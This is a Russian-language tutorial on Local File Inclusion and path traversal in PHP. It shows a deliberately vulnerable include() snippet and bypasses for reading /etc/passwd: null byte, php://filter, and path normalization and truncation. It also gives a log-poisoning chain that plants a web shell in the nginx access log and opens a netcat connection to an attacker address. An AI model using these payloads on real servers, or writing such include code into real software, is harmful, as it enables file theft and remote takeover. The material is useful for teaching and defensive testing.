# LFI, Path Traversal

Path Traversal - атака, которая позволяет получить доступ к файлам и каталогам с ограниченным доступом на сервере с целью получения информации. Уязвимость возникает, когда пользовательский ввод не проверяется должным образом и хакер может манипулировать им для обхода структуры каталогов сервера. Описание атаки: Хакер пытается использовать поле ввода, которое принимает в качестве входных данных путь к файлу. Предоставляя специально созданные входные данные, хакер может манипулировать сервером, обеспечивая доступ к неавторизованным файлам и каталогам. Для защиты от атаки рекомендуется: Проверять ввод пользователя, использовать механизмы контроля доступа, применить принцип наименьших привилегий, использовать Chroot Jails.

Local File Inclusion (LFI) - это возможность использования локальных файлов сервера. Уязвимость позволяет удаленному пользователю получить доступ с помощью специально сформированного запроса к произвольным файлам на сервере, в том числе потенциально содержащим конфиденциальную информацию.

Возникает подобная уязвимость в том случае, если при реализации веб-приложения используются небезопасные функции, например, `include`, позволяющие включать контент на страницу из локального файла. В нашем случае это выглядит следующим образом:

```php
<?php
	$file = $_GET['file'];
	if(isset($file))
	{
		include("$file");
	}
	?>
<b> <p align="center">Пример веб-приложения, доступный в Интеренте.</p></b>
```

Благодаря строчке `include(“$file”)` в содержимое страницы будет включаться значение GET-параметра `file`. Теперь, используя эту уязвимость, нам будут возвращаться локальные файлы, которые мы укажем в параметре.

## Обнаружение уязвимости

Как обнаружить уязвимость? Если указать в потенциально уязвимом параметре включение какого-то локального файла, например, index с любым расширением, и этот файл откроется, то однозначно можно утверждать, что параметр отвечает за подкачку файла. Сделать это можно как вручную, так и с помощью различных автоматизированных инструментов, например, сканером уязвимостей **Wapiti**, или специализированным инструментом **LFISuite**, который разработан именно под поиск и эксплуатацию LFI-уязвимостей.

Какие здесь могут быть подводные камни? Например, наличие фильтрации, которая будет подставлять в окончание строки расширение файла, например, **.php**. Таким образом, при попытке включения в страницу файла /etc/passwd мы получим в адресной строке file=/etc/passwd.php, а содержимое этого файла не будет отображаться на странице, так как файла не существует. Но такой фильтр можно обойти с помощью так называемого нулевого байта, который будет «отсекать» все, что будет идти после него. Дело в том, что вся адресная строка при передаче HTTP-запроса кодируется в URL-encode, и в этой кодировке нулевой байт выглядит как **%00**. Таким образом, строчка /etc/passwd%00.php будет преобразована в /etc/passwd. Однако стоит отметить, что данная проблема является довольно известной и исправлена в версии PHP 5.3+

Другой вариант обхода фильтрации - использование **php filter**. В параметре, отвечающем за включение файлов, пишем не просто путь до файла, который мы хотим включить, а путь до файла с использованием этой функции. Теперь запрос, который мы будем отправлять, имеет вид:

`http://site.test.lan/index2.php?file=php://filter/convert.base64-encode/resource=/etc/passwd`

И теперь на странице браузера мы увидим не содержимое файла, а его исходник в кодировке **base64**, который можно декодировать.

С основными моментами уязвимости LFI разобрались, и теперь понимаем, что при ее эксплуатации можно прочитать локальный файл на удаленном сервере. Но у LFI есть интересная особенность, позволяющая не просто прочитать локальные файлы, а скомпрометировать сервер.

## Отравление журнала веб-сервера

Думаю, стоит сразу оговориться, что уязвимость не новая, но тем не менее она до сих встречается и может представлять серьезную угрозу для безопасности веб-сервера. При взаимодействии с веб-приложением любой наш запрос записывается в журналы веб-сервера, как правило, это файлы **/var/log/nginx/access.log** или **/var/log/nginx/error.log** если, например, используется веб-сервер **Nginx**, но названия конечных файлов, разумеется, могут отличаться.

Теперь, составив специальный запрос, мы создадим веб-шелл на сервере, записав его в **access.log**. Для отправки запроса будем использовать инструмент Burp Suite, позволяющий в режиме реального времени перехватывать и редактировать запросы.

Наш веб-шелл `<?php system($_GET[cmd]); ?>` записан в журнале веб-сервера и готов к использованию.

Почему использовался именно параметр **User-Agent**? Как уже говорилось ранее, адресная строка кодирует информацию с помощью URL-encode, поэтому для передачи php-кода нужно использовать заголовки, а так как в **access.log** точно пишется User-Agent, то и используем его. Обратившись к нашему веб-шеллу, получаем возможность выполнять различные команды через параметр **cmd**:

`http://site.test.lan/index2.php?file=/var/log/nginx/access.log&cmd=ls /`

В чем отличие? LFI позволяет включать файл на сервере, но необходимо указать полный путь до этого файла, то есть знать, где этот файл находится. Во втором случае выполняется команда на самом сервере, а результат отображается в веб-приложении.

Убедившись, что мы можем выполнять различные команды на сервере, переходим к получению доступа на него. Для этого указываем в параметре **cmd** команду запуска **Netcat** для связи с сервером атакующего, то есть с нами:

`http://site.test.lan/index2.php?file=/var/log/nginx/access.log&cmd=nc 192.168.0.135 4455`

**Рекомендации**

- регулярно проверять безопасность веб-приложения с целью предотвращения возникновения уязвимостей;
- добавить в журнал веб-сервера строчку **<?php exit(1); ?>**. Данный скрипт будет предотвращать любые попытки выполнения php-кода в этом файле;
- использовать средства защиты веб-приложений, например, WAF, который будет блокировать вредоносный запрос, не позволяя его выполнить на веб-сервере.

## Альтернатива NULL-byte при LFI

Уязвимость основана на двух особенностях в функциях PHP для взаимодействия с файловой системой:

1. **Нормализация пути** PHP обрабатывает строку, содержащую путь до файла или папки, особым образом, в частности лишние символы “/” и “/.” удаляются.
2. **Усечение пути** PHP в зависимости от платформы имеет ограничение на длину пути, определяемой константой MAX_PATH, в результате чего все символы, находящиеся за пределами этого значения, отбрасываются.

## Нормализация пути

Всем известно, что в PHP имеется большое количество возможностей для быстрого и простого программирования. PHP способен совершать множество необходимых действий самостоятельно, не обременяя разработчика лишними заботами. Такая направленность PHP однако имеет и обратную сторону – возможно именно по причине излишней обработки путей возможна новая уязвимость. Примеры нормализации пути:

```php
<?php
include('/etc//passwd'); //работает
include('/etc///passwd'); //работает
include('/etc/./passwd'); //работает
include('/etc/passwd/.'); //работает
include('/etc/passwd/./.'); //работает
?>
```

Нормализация пути может быть использована атакующим для обхода проверки расширения или имени файла в различных ситауциях, например при загрузке файлов или в веб-приложении, реализующем преднамеренный просмотр своего исходного кода. Уязвимость имеет место при неправильно реализованной проверке, которая основывается на принципе черного списка (blacklist), т.е. веб-приложение сверяет данные со списком нежелательных значений. Например:

```php
<?php
$parts = pathinfo($_GET['filename']);
$ext = $parts['extension'];
$blacklist = array('php', 'phtml', 'php3', 'php4', 'php5');
if(in_array($ext, $blacklist)) {
	die('Invalid input');
}
?>
```

Если в filename передать значение “`file.php`”, то проверка сработает успешно, но если же добавить к этому значению “**`/.`**“, то `pathinfo()` вернет неверный массив, в котором элемент “`dirname`” будет равен “`file.php`”.Причина уязвимости кроется в функции `virtual_file_ex()` (TSRM/tsrm_virtual_cwd.c):

```php
tok=NULL;
ptr = tsrm_strtok_r(path_copy, TOKENIZER_STRING, &tok);
while (ptr) {
	ptr_length = strlen(ptr);
	/* */
	if (IS_DIRECTORY_UP(ptr, ptr_length)) {
		/* */
	} else if (!IS_DIRECTORY_CURRENT(ptr, ptr_length)) {
		/* */
	}
	ptr = tsrm_strtok_r(NULL, TOKENIZER_STRING, &tok);
}
```

Путь разбивается на части символом, значение которого хранится в `TOKENIZER_STRING`:

```php
#define TOKENIZER_STRING "/\\\\" // Win32
#define TOKENIZER_STRING "/\\\\" // NETWARE
#define TOKENIZER_STRING "/" // other (*nix)
```

Затем в цикле каждая часть проверяется на соответствие с `IS_DIRECTORY_UP` и `IS_DIRECTORY_CURRENT`, значения которых определены так:

```php
#define IS_DIRECTORY_UP(element, len) \\
    (len >= 2 && !php_check_dots(element, len))
#define IS_DIRECTORY_CURRENT(element, len) \\
    (len == 1 && element[0] == '.')
```

Таким образом, каждая часть пути, разделенная на `TOKENIZER_STRING`, анализируется в цикле с помощью нехитрых проверок, при чем ни одна из них не вызывает ошибку, что в конечном счете приводит к уязвимости, так как все нейтральные “`./`” убираются.Стоит отметить, что простая последовательность из символов “`/`”, стоящая в конце пути, не приведет к желаемому результату, если используется “чистый” PHP без всяких патчей. Однако PHP с **Suhosin patch** будет принимать такие значения:

```php
<?php
include('/etc/passwd///');
?>
```

Все дело в том, что **Suhosin patch** заменяет функцию `realpath()`, отсюда возникают расхождения. Патч полностью убирает замыкающие символы “`/`”, в то время как стандартный PHP преобразует все дополнительные символы “`/`” в один, что сделает имя файла неправильным. Тем не менее, одиночные символы “`/`.” или их последовательность будут работать на любой установке PHP.

## Усечение пути

Вторая особенность, позволяющая говорить о новой уязвимости в PHP, – это автоматическое усечение длины пути подобно тому, как это происходит в MySQL с ограниченными по длине колонками. Благодаря этому, в локальных инклудах NULL-байт может быть заменен на последовательность символов, состоящих из “`/`”, “`./`”, “`/.`” и других. Например имеется следующий уязвимый скрипт:

```php
<?php
// magic_quotes_gpc=on
include('includes/'.$_GET['act'].'.php');
?>
```

Это классическая LFI-уязвимость. В данном примере атакующий может изменять центральную часть аргумента функции `include()`, поэтому проведение RFI (remote file include) является невозможным, так как для этого необходимо контролировать начало значения для указания протокола передачи данных (http, ftp, data, etc). Для реализации локального инклуда атакующий может внедрить произвольный PHP-код в файловую систему сервера для дальнейшего его выполнения через LFI. При этом очень часто требуется отбросить расширение файла, что обычно достигается путем использования NULL-байта. Как известно, многие функции PHP, в частности `ereg(i)_*`, `include`, `require`, `etc` не являются бинарно безопасными, т.е. как и в C/C++, NULL-байт будет интерпретироваться как конец строки. Использование NULL-байта затрудняется тем, что включенная директива `magic_quotes_gpc`, а также применение функции `addslashes()` экранируют нулевой символ, что существенно сокращает поле его применения.

Пример LFI-вектора с NULL-байтом:

**`index.php?act=../../../../../etc/passwd%00`**

После экранирования в `include()` попадет значение “**includes/../../../../../etc/passwd \0.php**”.

Новый вектор способен предоставить полноценную альтернативу NULL-байту:

**`index.php?act=../../../../../etc/passwd/////[…]/////`**

Количество символов “`/`” отличается на разных платформах, но в большинстве случаев максимальная длина полного пути (т.е. после преобразования относительного в абсолютный путь) равна 4096 байт. Само усечение пути выполняется в **main/streams/plain_wrapper.c** и **main/fopen_wrappers.c** неправильным вызовом `snprintf()`:

**`snprintf(trypath, MAXPATHLEN, "%s/%s", ptr, filename);`**

Как и в MySQL, PHP без всяких вопросов и предупреждений обрезает строку, длина которой становится равной MAXPATHLEN. Значение MAXPATHLEN определяется так: **/main/php.h**:

```php
#ifndef MAXPATHLEN
# ifdef PATH_MAX
# define MAXPATHLEN PATH_MAX
# elif defined(MAX_PATH)
# define MAXPATHLEN MAX_PATH
# else
# define MAXPATHLEN 256
# endif
#endif
```

**/win32/param.h**:

```php
#ifndef MAXPATHLEN
# define MAXPATHLEN _MAX_PATH
#endif
```

Усечение пути в сочетании с нормализацией пути позволяет заменить NULL-байт для установок PHP с включенным **magic_quotes_gpc**. Последовательность после желаемого пути может состоять из символов “`/`”, “`/.`”, “`./`”; в win32 этот список гораздо шире: `0x20` (пробел), `0x22` (“), `0x2E` (.), `0x3c` (<), `0x3e` (>), `0x5c` (\). Следует заметить, что в стандартных сборках PHP для удачной реализации уязвимости последним символом пути должна быть точка. Что касается символа “`/`”, то его нормализация происходит на всех платформах, но в стандартной сборке PHP последовательность из слэшей преобразуется в один, поэтому очень часто его применение может быть невозможно. Однако по утверждениям Стефана Эссера использовать слэш в атаках можно на любых *bsd платформах, даже без Suhosin patch. По собственным наблюдениям могу предположить, что на всех *bsd-серверах длина последовательности составляет 1024 байта, в то время как на linux эта цифра в четыре раза больше. В windows была замечена самая короткая последовательность – не более 270 байт.

Угулублясь в исходный код PHP, становится очевиным, что уязвимость обязана своему существованию такой директиве конфигурации PHP как **include_path**, которая представляет собой аналог PATH на unix-системах. Всякий раз когда вызывается `include()` или `require()` с относительным путем в качестве аргумента, PHP производит попытки чтения файлов, последовательно подставляя папки, разделенных символов “`:`”, из значения директивы. По умолчанию `include_path` равен “`.:`”, но обычно в это значение добавляется еще несколько путей до различных библиотек, PEAR и прочего. В ходе исследований команды **USH** выяснилось, что условием удачной атаки является наличие хотя бы одного абсолютного пути в значении **include_path**.
